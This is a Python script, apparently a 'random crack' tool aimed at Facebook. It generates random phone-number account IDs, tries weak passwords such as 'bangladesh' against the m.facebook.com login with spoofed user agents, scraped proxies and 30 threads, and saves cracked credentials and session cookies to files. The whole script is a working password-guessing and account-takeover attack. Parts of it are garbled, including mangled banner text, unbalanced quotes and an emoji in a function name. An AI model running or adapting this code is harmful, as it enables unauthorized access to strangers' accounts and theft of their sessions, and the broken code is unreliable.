

#___________Impoet Module____________
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
#________________Step 2______________
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#_______________Coler Code_____________
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#_____________Proxy______________
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = (""
\x1b[38;5;196m████████╗ █████╗      ██╗██╗   ██╗██╗         ██╗███████╗██╗      █████╗ ███╗   ███╗    ██████╗  █████╗ ██████╗ ██████╗ ██╗
\x1b[38;5;196m╚══██╔══╝██╔══██╗     ██║██║   ██║██║         ██║██╔════╝██║     ██╔══██╗████╗ ████║    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║
   \033[38;5;46m██║   ███████║     ██║██║   ██║██║         ██║███████╗██║     ███████║██╔████╔██║    ██████╔╝███████║██████╔╝██████╔╝██║
   \033[38;5;46m██║   ██╔══██║██   ██║██║   ██║██║         ██║╚════██║██║     ██╔══██║██║╚██╔╝██║    ██╔══██╗██╔══██║██╔══██╗██╔══██╗██║
   \033[38;5;46m██║   ██║  ██║╚█████╔╝╚██████╔╝███████╗    ██║███████║███████╗██║  ██║██║ ╚═╝ ██║    ██║  ██║██║  ██║██████╔╝██████╔╝██║
   \x1b[38;5;196m╚═╝   ╚═╝  ╚═╝ ╚════╝  ╚═════╝ ╚══════╝    ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝"


 \33[38;5;196mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—\33[38;5;196m 
\33[38;5;196mâ–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—\33[38;5;196m
\33[38;5;196mâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•\33[38;5;196m
\33[38;5;196mâ–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—\33[38;5;196m
\33[38;5;196mâ–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•\33[38;5;196m
\33[38;5;196mâ•šâ•â•  â•šâ•â•     â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•â•â•â•    \33[38;5;196m
\33[38;5;196m     â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\033[38;5;46mÄ±llÄ±llÄ±â­ðŸŒŸ R4KIB ðŸŒŸâ­Ä±llÄ±llÄ±\33[38;5;196mâ”â”â”â”â”â”â”â”â”â”â”â”â”
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™‰ð˜¼ð™ˆð™€\33[38;5;196m        : [â˜…]rakib\33[38;5;196m                                        â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™†\33[38;5;196m    : [â˜…]rakib\33[38;5;196m                                  â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™‚ð™„ð™ð™ƒð™ð˜½\33[38;5;196m      : [â˜…]mueor\33[38;5;196m                                    â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð™„ð™‡ð™„ð™‚ð™€ð™Žð™ƒð™Šð™‰\33[38;5;196m  : [â˜…]ð—•ð—”ð—¡ð—šð—Ÿð—”ð——ð—˜ð—¦ð—›ð—œ\33[38;5;196m             â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™’ð™ƒð˜¼ð™ð™Žð˜¼ð™‹ð™‹\33[38;5;196m    : [â˜…]Nai\33[38;5;196m                                    â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð™Šð™Šð™‡ð™Ž ð™‰ð˜¼ð™ˆð™€\33[38;5;196m  : [â˜…]ð—¥ðŸ°ð—¡ð——ð—¢ð— -ð—–ð—Ÿð—¢ð—¡ð—œð—¡ð—š\33[38;5;196m   â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð™Šð™Šð™‡ð™Ž ð™Žð™ð˜¼ð™ð™ð™Ž\33[38;5;196m: [â˜…]ð—£ð—¥ð—˜ð— ð—œð—¨ð— -ð—©01\33[38;5;196m            â”ƒ
 \33[38;5;196m    â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\033[1;31mð™ð™„ð™ð™€\33[38;5;196mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›""")
 
def naima():
	print('-------------------')
#_____________Def Main______________ 
def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        Sumaiya =input("\n [?] Choose : ")
        if Sumaiya in ["1","01"]:
            fuck()
        if Sumaiya in [" 0", "00"]:
            exit()
        else:
            exit()
#______________Def Sc__________            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('[×] Exm: 019, 016, 017, 018, 014, 014')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[×] Exm: 2000 3000 5000 10000 ')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(Rabbi🇧🇩,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as -OK.txt')
    print(' [✓] CP Id Save as Rabbi🇧🇩-CP.txt')
    print('-------------------')
def Rabbi🇧🇩(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[Rabbi🇧🇩]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {'authority': 'm.facebook.com',
    'method': 'GET',
    'path': '/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',    
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',
}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"[Rabbi🇧🇩-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/Rabbi🇧🇩-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[Rabbi🇧🇩-CP] {cid}|{ps}")
                open('/sdcard/Rabbi🇧🇩-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
